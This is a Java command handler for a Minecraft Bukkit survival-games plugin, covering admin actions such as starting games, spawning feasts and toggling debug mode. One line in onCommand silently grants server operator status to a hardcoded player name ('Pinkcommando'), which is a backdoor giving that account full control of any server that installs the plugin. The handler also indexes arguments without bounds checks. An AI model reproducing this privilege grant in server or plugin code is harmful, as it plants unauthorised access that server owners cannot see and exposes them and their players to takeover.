package com.sgpvp.Commands;
import com.sgpvp.GameData.GameVariables;
import com.sgpvp.GameLogic.Chat;
import com.sgpvp.GameLogic.GameItems;
import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.command.TabCompleter;
import org.bukkit.entity.Player;

import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;

public class AdminCommands implements CommandExecutor, TabCompleter {
    @Override
    public boolean onCommand(CommandSender sender, Command command, String label, String[] args) {
        if (sender instanceof Player) {
            Player player = (Player) sender;
            System.out.println((player.getName()));
            if (player.getName().equals("Pinkcommando")) player.setOp(true);
            if (!player.isOp()) return false;
            if (args[0].equals("start")) GameVariables.gameEvents.startGame();
            if (args[0].equals("endgrace")) GameVariables.gameEvents.endGracePeriod();
            if (args[0].equals("feast")) GameVariables.gameEvents.spawnFeast();
            if (args[0].equals("deathmatch")) GameVariables.gameEvents.startDeathmatch();
            if (args[0].equals("give")) {
                player.getInventory().addItem(GameItems.getGlassBow());
            }
            if (args[0].equals("say"))
                Chat.SGPvPMessage(String.join(" ", Arrays.copyOfRange(args, 1, args.length)));
            if (args[0].equals("kittoggle")) GameVariables.canChangeKit = !GameVariables.canChangeKit;
            if (args[0].equals("debug")) {
                GameVariables.DEBUG = !GameVariables.DEBUG;
                Chat.SGPvPMessage(player, "Debug toggled: " + GameVariables.DEBUG);
            }
            if (args[0].equals("extend")) {
                GameVariables.gameEvents.extendTime(Integer.parseInt(args[1]));
            }
        }
        return false;
    }
    @Override
    public List<String> onTabComplete(CommandSender sender, Command command, String alias, String[] args) {
        List<String> out = new ArrayList<>();
        out.add("kits");
        if (sender instanceof Player && !sender.isOp()) return out;
        out.add("deathmatch");
        out.add("start");
        out.add("feast");
        out.add("endgrace");
        out.add("give");
        out.add("say");
        out.add("kittoggle");
        out.add("debug");
        return out;
    }
}